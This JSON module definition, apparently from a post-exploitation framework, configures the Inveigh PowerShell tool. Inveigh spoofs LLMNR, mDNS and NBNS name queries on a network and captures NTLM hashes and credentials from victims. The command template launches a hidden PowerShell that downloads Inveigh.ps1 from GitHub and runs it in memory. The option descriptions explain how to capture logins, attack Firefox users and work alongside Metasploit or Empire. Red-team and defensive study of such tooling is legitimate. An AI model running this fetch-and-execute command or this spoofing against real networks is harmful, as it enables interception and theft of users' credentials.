{
  "base": {
    "name": "Inveigh",
    "type": "standard",
    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
    "credits": ["Kevin Robertson (@kevin_robertson)"],
    "path": ["windows", "x64", "powershell", "credentials", "Inveigh"],
    "platform": "windows",
    "arch": "x64",
    "lang": "powershell",
    "privilege": false,
    "remote": "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1",
    "local": ["data", "src", "Kevin-Robertson", "Inveigh", "scripts", "Inveigh.ps1"],
    "options": [
      {"name": "Challenge", "value": "", "required": false, "flag": "-Challenge", "description":"Default = Random: 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request."},
      {"name": "ConsoleOutput", "value": "Y", "required": false, "flag": "-ConsoleOutput", "description":"Default = Disabled: (Low/Medium/Y/N) Enable/Disable real time console output. If using this option through a shell, test to ensure that it doesn't hang the shell. Medium and Low can be used to reduce output."},
      {"name": "ConsoleQueueLimit", "value": "", "required": false, "flag": "-ConsoleQueueLimit", "description":"Default = Unlimited: Maximum number of queued up console log entries when not using the real time console."},
      {"name": "ConsoleStatus", "value": "", "required": false, "flag": "-ConsoleStatus", "description":"(Integer) Interval in minutes for displaying all unique captured hashes and credentials. This is useful for displaying full capture lists when running through a shell that does not have access to the support functions."},
      {"name": "ConsoleUnique", "value": "", "required": false, "flag": "-ConsoleUnique", "description":"Default = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname, and username combinations when real time console output is enabled."},
      {"name": "ElevatedPrivilege", "value": "", "required": false, "flag": "-ElevatedPrivilege", "description":"Default = Auto: (Auto/Y/N) Set the privilege mode. Auto will determine if Inveigh is running with elevated privilege. If so, options that require elevated privilege can be used."},
      {"name": "FileOutput", "value": "", "required": false, "flag": "-FileOutput", "description":"Default = Disabled: (Y/N) Enable/Disable real time file output."},
      {"name": "FileOutputDirectory", "value": "", "required": false, "flag": "-FileOutputDirectory", "description":"Default = Working Directory: Valid path to an output directory for log and capture files. FileOutput must also be enabled."},
      {"name": "FileUnique", "value": "", "required": false, "flag": "-FileUnique", "description":"Default = Enabled: (Y/N) Enable/Disable outputting challenge/response hashes for only unique IP, domain/hostname, and username combinations when real time file output is enabled."},
      {"name": "HTTP", "value": "", "required": false, "flag": "-HTTP", "description":"Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture."},
      {"name": "HTTPIP", "value": "", "required": false, "flag": "-HTTPIP", "description":"Default = Any: IP address for the HTTP/HTTPS listener."},
      {"name": "HTTPPort", "value": "", "required": false, "flag": "-HTTPPort", "description":"Default = 80: TCP port for the HTTP listener."},
      {"name": "HTTPAuth", "value": "", "required": false, "flag": "-HTTPAuth", "description":"Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authentication type. This setting does not apply to wpad.dat requests. NTLMNoESS turns off the 'Extended Session Security' flag during negotiation."},
      {"name": "HTTPBasicRealm", "value": "", "required": false, "flag": "-HTTPBasicRealm", "description":"Realm name for Basic authentication. This parameter applies to both HTTPAuth and WPADAuth."},
      {"name": "HTTPContentType", "value": "", "required": false, "flag": "-HTTPContentType", "description":"Default = text/html: Content type for HTTP/HTTPS/Proxy responses. Does not apply to EXEs and wpad.dat. Set to \"application/hta\" for HTA files or when using HTA code with HTTPResponse."},
      {"name": "HTTPDir", "value": "", "required": false, "flag": "-HTTPDir", "description":"Full directory path to enable hosting of basic content through the HTTP/HTTPS listener."},
      {"name": "HTTPDefaultFile", "value": "", "required": false, "flag": "-HTTPDefaultFile", "description":"Filename within the HTTPDir to serve as the default HTTP/HTTPS/Proxy response file. This file will not be used for wpad.dat requests."},
      {"name": "HTTPDefaultEXE", "value": "", "required": false, "flag": "-HTTPDefaultEXE", "description":"EXE filename within the HTTPDir to serve as the default HTTP/HTTPS/Proxy response for EXE requests."},
      {"name": "HTTPResetDelay", "value": "", "required": false, "flag": "-HTTPResetDelay", "description":"Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers will have a delay before their connections are reset when Inveigh doesn't receive data. This can increase the chance of capturing authentication through a popup box with some browsers (Firefox)."},
      {"name": "HTTPResetDelayTimeout", "value": "", "required": false, "flag": "-HTTPResetDelayTimeout", "description":"Default = 30 Seconds: HTTPResetDelay timeout in seconds."},
      {"name": "HTTPResponse", "value": "", "required": false, "flag": "-HTTPResponse", "description":"Content to serve as the default HTTP/HTTPS/Proxy response. This response will not be used for wpad.dat requests. This parameter will not be used if HTTPDir is set. Use PowerShell character escapes and newlines where necessary."},
      {"name": "HTTPS", "value": "", "required": false, "flag": "-HTTPS", "description":"Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in the local store. If the script does not exit gracefully, manually remove the certificate. This feature requires local administrator access."},
      {"name": "HTTPSPort", "value": "", "required": false, "flag": "-HTTPSPort", "description":"Default = 443: TCP port for the HTTPS listener."},
      {"name": "HTTPSCertIssuer", "value": "", "required": false, "flag": "-HTTPSCertIssuer", "description":"Default = Inveigh: The issuer field for the cert that will be installed for HTTPS."},
      {"name": "HTTPSCertSubject", "value": "", "required": false, "flag": "-HTTPSCertSubject", "description":"Default = localhost: The subject field for the cert that will be installed for HTTPS."},
      {"name": "HTTPSForceCertDelete", "value": "", "required": false, "flag": "-HTTPSForceCertDelete", "description":"Default = Disabled: (Y/N) Force deletion of an existing certificate that matches HTTPSCertIssuer and HTTPSCertSubject."},
      {"name": "Inspect", "value": "", "required": false, "flag": "-Inspect", "description":"(Switch) Inspect LLMNR/mDNS/NBNS traffic only. With elevated privilege, SMB must be disabled with -smb if you do not want NTLMv1/NTLMv2 captures over SMB. Without elevated privilege, the desired inspect listeners must be enabled."},
      {"name": "IP", "value": "", "required": false, "flag": "-IP", "description":"Local IP address for listening and packet sniffing. This IP address will also be used for LLMNR/mDNS/NBNS spoofing if the SpooferIP parameter is not set."},
      {"name": "LogOutput", "value": "", "required": false, "flag": "-LogOutput", "description":"Default = Enabled: (Y/N) Enable/Disable storing log messages in memory."},
      {"name": "LLMNR", "value": "", "required": false, "flag": "-LLMNR", "description":"Default = Enabled: (Y/N) Enable/Disable LLMNR spoofing."},
      {"name": "LLMNRTTL", "value": "", "required": false, "flag": "-LLMNRTTL", "description":"Default = 30 Seconds: LLMNR TTL in seconds for the response packet."},
      {"name": "MachineAccounts", "value": "", "required": false, "flag": "-MachineAccounts", "description":"Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts."},
      {"name": "mDNS", "value": "", "required": false, "flag": "-mDNS", "description":"Default = Disabled: (Y/N) Enable/Disable mDNS spoofing."},
      {"name": "mDNSTTL", "value": "", "required": false, "flag": "-mDNSTTL", "description":"Default = 120 Seconds: mDNS TTL in seconds for the response packet."},
      {"name": "mDNSTypes", "value": "", "required": false, "flag": "-mDNSTypes", "description":"Default = QU: Comma separated list of mDNS types to spoof. Note that QM will send the response to 224.0.0.251. Types include QU = Query Unicast, QM = Query Multicast"},
      {"name": "NBNS", "value": "", "required": false, "flag": "-NBNS", "description":"Default = Disabled: (Y/N) Enable/Disable NBNS spoofing."},
      {"name": "NBNSBruteForce", "value": "", "required": false, "flag": "-NBNSBruteForce", "description":"Default = Disabled: (Y/N) Enable/Disable NBNS brute force spoofer."},
      {"name": "NBNSBruteForceHost", "value": "", "required": false, "flag": "-NBNSBruteForceHost", "description":"Default = WPAD: Hostname for the NBNS Brute Force spoofer"},
      {"name": "NBNSBruteForcePause", "value": "", "required": false, "flag": "-NBNSBruteForcePause", "description":"Default = Disabled: (Integer) Number of seconds the NBNS brute force spoofer will stop spoofing after an incoming HTTP request is received."},
      {"name": "NBNSBruteForceTarget", "value": "", "required": false, "flag": "-NBNSBruteForceTarget", "description":"IP address to target for NBNS brute force spoofing. "},
      {"name": "NBNSTTL", "value": "", "required": false, "flag": "-NBNSTTL", "description":"Default = 165 Seconds: NBNS TTL in seconds for the response packet."},
      {"name": "NBNSTypes", "value": "", "required": false, "flag": "-NBNSTypes", "description":"Default = 00,20: Comma separated list of NBNS types to spoof. Types include 00 = Workstation Service, 03 = Messenger Service, 20 = Server Service, 1B = Domain Name"},
      {"name": "OutputStreamOnly", "value": "", "required": false, "flag": "-OutputStreamOnly", "description":"Default = Disabled: (Y/N) Enable/Disable forcing all output to the standard output stream. This can be helpful if running Inveigh through a shell that does not return other output streams.Note that you will not see the various yellow warning messages if enabled."},
      {"name": "Proxy", "value": "", "required": false, "flag": "-Proxy", "description":"Default = Disabled: (Y/N) Enable/Disable proxy listener authentication captures."},
      {"name": "ProxyAuth", "value": "", "required": false, "flag": "-ProxyAuth", "description":"Default = NTLM: (Basic/NTLM/NTLMNoESS) Proxy listener authentication type."},
      {"name": "ProxyIP", "value": "", "required": false, "flag": "-ProxyIP", "description":"Default = Any: IP address for the proxy listener."},
      {"name": "ProxyPort", "value": "", "required": false, "flag": "-ProxyPort", "description":"Default = 8492: TCP port for the proxy listener."},
      {"name": "ProxyIgnore", "value": "", "required": false, "flag": "-ProxyIgnore", "description":"Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers will not be sent the wpad.dat file used for capturing proxy authentications. Firefox does not work correctly with the proxy server failover setup. Firefox will be left unable to connect to any sites until the proxy is cleared. Remove \"Firefox\" from this list to attack Firefox. If attacking Firefox, consider setting -SpooferRepeat N to limit attacks against a single target so that victims can recover Firefox connectivity by closing and reopening."},
      {"name": "ShowHelp", "value": "", "required": false, "flag": "-ShowHelp", "description":"Default = Enabled: (Y/N) Enable/Disable the help messages at startup."},
      {"name": "SMB", "value": "", "required": false, "flag": "-SMB", "description":"Default = Enabled: (Y/N) Enable/Disable SMB challenge/response capture. Warning, LLMNR/NBNS spoofing can still direct targets to the host system's SMB server. Block TCP ports 445/139 or kill the SMB services if you need to prevent login requests from being processed by the Inveigh host."},
      {"name": "SpooferHostsIgnore", "value": "", "required": false, "flag": "-SpooferHostsIgnore", "description":"Default = All: Comma separated list of requested hostnames to ignore when spoofing with LLMNR/mDNS/NBNS."},
      {"name": "SpooferHostsReply", "value": "", "required": false, "flag": "-SpooferHostsReply", "description":"Default = All: Comma separated list of requested hostnames to respond to when spoofing with LLMNR/mDNS/NBNS."},
      {"name": "SpooferIP", "value": "", "required": false, "flag": "-SpooferIP", "description":"IP address for LLMNR/mDNS/NBNS spoofing. This parameter is only necessary when redirecting victims to a system other than the Inveigh host."},
      {"name": "SpooferIPsIgnore", "value": "", "required": false, "flag": "-SpooferIPsIgnore", "description":"Default = All: Comma separated list of source IP addresses to ignore when spoofing with LLMNR/mDNS/NBNS."},
      {"name": "SpooferIPsReply", "value": "", "required": false, "flag": "-SpooferIPsReply", "description":"Default = All: Comma separated list of source IP addresses to respond to when spoofing with LLMNR/mDNS/NBNS."},
      {"name": "SpooferLearning", "value": "", "required": false, "flag": "-SpooferLearning", "description":"Default = Disabled: (Y/N) Enable/Disable LLMNR/NBNS valid host learning. If enabled, Inveigh will send out LLMNR/NBNS requests for any received LLMNR/NBNS requests. If a response is received, Inveigh will add the hostname to a spoofing blacklist."},
      {"name": "SpooferLearningDelay", "value": "", "required": false, "flag": "-SpooferLearningDelay", "description":"(Integer) Time in minutes that Inveigh will delay spoofing while valid hosts are being blacklisted through SpooferLearning."},
      {"name": "SpooferLearningInterval", "value": "", "required": false, "flag": "-SpooferLearningInterval", "description":"Default = 30 Minutes: (Integer) Time in minutes that Inveigh wait before sending out an LLMNR/NBNS request for a hostname that has already been checked if SpooferLearning is enabled."},
      {"name": "SpooferRepeat", "value": "", "required": false, "flag": "-SpooferRepeat", "description":"Default = Enabled: (Y/N) Enable/Disable repeated LLMNR/NBNS spoofs to a victim system after one user challenge/response has been captured."},
      {"name": "StartupChecks", "value": "", "required": false, "flag": "-StartupChecks", "description":"Default = Enabled: (Y/N) Enable/Disable checks for in use ports and running services on startup."},
      {"name": "StatusOutput", "value": "", "required": false, "flag": "-StatusOutput", "description":"Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages."},
      {"name": "RunCount", "value": "", "required": false, "flag": "-RunCount", "description":"Default = Unlimited: (Integer) Number of NTLMv1/NTLMv2/cleartext captures to perform before auto-exiting."},
      {"name": "RunTime", "value": "5", "required": false, "flag": "-RunTime", "description":"(Integer) Run time duration in minutes."},
      {"name": "Tool", "value": "", "required": false, "flag": "-Tool", "description":"Default = 0: (0/1/2) Enable/Disable features for better operation through external tools such as Meterpreter's PowerShell extension, Metasploit's Interactive PowerShell Sessions payloads and Empire. 0 = None, 1 = Metasploit/Meterpreter, 2 = Empire "},
      {"name": "WPADAuth", "value": "", "required": false, "flag": "-WPADAuth", "description":"Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authentication type for wpad.dat requests. Setting to Anonymous can prevent browser login prompts. NTLMNoESS turns off the 'Extended Session Security' flag during negotiation."},
      {"name": "WPADAuthIgnore", "value": "", "required": false, "flag": "-WPADAuthIgnore", "description":"Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers will be skipped for NTLM authentication. This can be used to filter out browsers like Firefox that display login popups for authenticated wpad.dat requests such as Firefox."},
      {"name": "WPADDirectFile", "value": "", "required": false, "flag": "-WPADDirectFile", "description":"Default = Enabled: (Y/N) Enable/Disable serving a proxyless, all direct, wpad.dat file for wpad.dat requests. Enabling this setting can reduce the amount of redundant wpad.dat requests. This parameter is ignored when using WPADIP, WPADPort, or WPADResponse."},
      {"name": "WPADDirectHosts", "value": "", "required": false, "flag": "-WPADDirectHosts", "description":"Comma separated list of hosts to list as direct in the wpad.dat file. Listed hosts will not be routed through the defined proxy."},
      {"name": "WPADIP", "value": "", "required": false, "flag": "-WPADIP", "description":"Proxy server IP to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADPort."},
      {"name": "WPADPort", "value": "", "required": false, "flag": "-WPADPort", "description":"Proxy server port to be included in a basic wpad.dat response for WPAD enabled browsers. This parameter must be used with WPADIP."},
      {"name": "WPADResponse", "value": "", "required": false, "flag": "-WPADResponse", "description":"wpad.dat file contents to serve as the wpad.dat response. This parameter will not be used if WPADIP and WPADPort are set. Use PowerShell character escapes where necessary."}
    ],
    "description": "Invoke-Inveigh is a Windows PowerShell LLMNR/mDNS/NBNS spoofer/man-in-the-middle tool with challenge/response capture over HTTP/HTTPS/Proxy/SMB.",
    "notes": "\r\n\t-Kevin Robertson (@kevin_robertson) is the creator of Inveigh: https://github.com/Kevin-Robertson/Inveigh\r\n\t-This module's default configuration runs Inveigh for 5 minutes with ConsoleOutput set to \"Y\".\r\n\t-Disabling ConsoleOutput will cause Inveigh to return after startup and you will not be able to see any results unless you used a log file.",
    "commands": [
      "powershell.exe",
      "-nop",
      "-w 1",
      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1');",
      "Invoke-Inveigh",
      "{{Challenge}}",
      "{{ConsoleOutput}}",
      "{{ConsoleQueueLimit}}",
      "{{ConsoleStatus}}",
      "{{ConsoleUnique}}",
      "{{ElevatedPrivilege}}",
      "{{FileOutput}}",
      "{{FileOutputDirectory}}",
      "{{FileUnique}}",
      "{{HTTP}}",
      "{{HTTPIP}}",
      "{{HTTPPort}}",
      "{{HTTPAuth}}",
      "{{HTTPBasicRealm}}",
      "{{HTTPContentType}}",
      "{{HTTPDir}}",
      "{{HTTPDefaultFile}}",
      "{{HTTPDefaultEXE}}",
      "{{HTTPResetDelay}}",
      "{{HTTPResetDelayTimeout}}",
      "{{HTTPResponse}}",
      "{{HTTPS}}",
      "{{HTTPSPort}}",
      "{{HTTPSCertIssuer}}",
      "{{HTTPSCertSubject}}",
      "{{HTTPSForceCertDelete}}",
      "{{Inspect.Flag}}",
      "{{LogOutput}}",
      "{{IP}}",
      "{{LLMNR}}",
      "{{LLMNRTTL}}",
      "{{MachineAccounts}}",
      "{{mDNS}}",
      "{{mDNSTTL}}",
      "{{mDNSTypes}}",
      "{{NBNS}}",
      "{{NBNSBruteForce}}",
      "{{NBNSBruteForceHost}}",
      "{{NBNSBruteForcePause}}",
      "{{NBNSBruteForceTarget}}",
      "{{NBNSTTL}}",
      "{{NBNSTypes}}",
      "{{OutputStreamOnly}}",
      "{{Proxy}}",
      "{{ProxyAuth}}",
      "{{ProxyIP}}",
      "{{ProxyPort}}",
      "{{ProxyIgnore}}",
      "{{ShowHelp}}",
      "{{SMB}}",
      "{{SpooferHostsIgnore}}",
      "{{SpooferHostsReply}}",
      "{{SpooferIP}}",
      "{{SpooferIPsIgnore}}",
      "{{SpooferIPsReply}}",
      "{{SpooferLearning}}",
      "{{SpooferLearningDelay}}",
      "{{SpooferLearningInterval}}",
      "{{SpooferRepeat}}",
      "{{StartupChecks}}",
      "{{StatusOutput}}",
      "{{RunCount}}",
      "{{RunTime}}",
      "{{Tool}}",
      "{{WPADAuth}}",
      "{{WPADAuthIgnore}}",
      "{{WPADDirectFile}}",
      "{{WPADDirectHosts}}",
      "{{WPADIP}}",
      "{{WPADPort}}",
      "{{WPADResponse}}",
      "\""
    ]
  }
}